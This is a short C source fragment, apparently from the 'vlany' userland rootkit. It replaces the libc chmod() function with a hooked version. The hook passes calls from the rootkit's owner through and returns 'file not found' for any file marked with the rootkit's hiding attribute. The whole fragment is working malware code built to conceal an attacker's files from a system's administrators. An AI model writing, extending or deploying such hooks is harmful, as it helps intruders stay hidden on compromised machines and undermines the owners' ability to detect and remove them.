int chmod(const char *path, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] chmod() called\n");
    #endif

    HOOK(old_chmod, CCHMOD);

    if(owned()) return old_chmod(path, mode);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_chmod(path, mode);
}
